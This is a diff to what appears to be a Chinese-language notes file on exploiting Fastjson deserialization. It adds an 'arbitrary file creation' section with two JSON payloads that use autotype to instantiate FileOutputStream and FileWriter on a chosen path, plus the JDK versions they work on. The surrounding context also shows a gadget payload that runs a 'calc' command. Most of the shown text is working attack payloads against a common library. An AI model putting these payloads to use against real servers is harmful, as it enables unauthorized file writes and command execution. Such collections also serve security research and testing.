@@ -692,6 +692,23 @@ https://b1ue.cn/archives/348.html   **使用Throwable子类造成信息泄露**
 {"@type":"java.lang.AutoCloseable","@type":"vul.VulAutoCloseable","cmd":"calc"}
 ```
 
+任意文件创建
+```json
+{
+    '@type':"java.lang.AutoCloseable",
+    '@type':'java.io.FileOutputStream',
+    'file':'/tmp/nonexist',
+    'append':false
+}
+
+{
+    '@type':"java.lang.AutoCloseable",
+    '@type':'java.io.FileWriter',
+    'file':'/tmp/nonexist',
+    'append':false
+}
+jdk_1.8.0 172,201,221,jdk11可以，虽然也没有默认的无参构造器，但是可以成功。
+``
 
 
 读文件
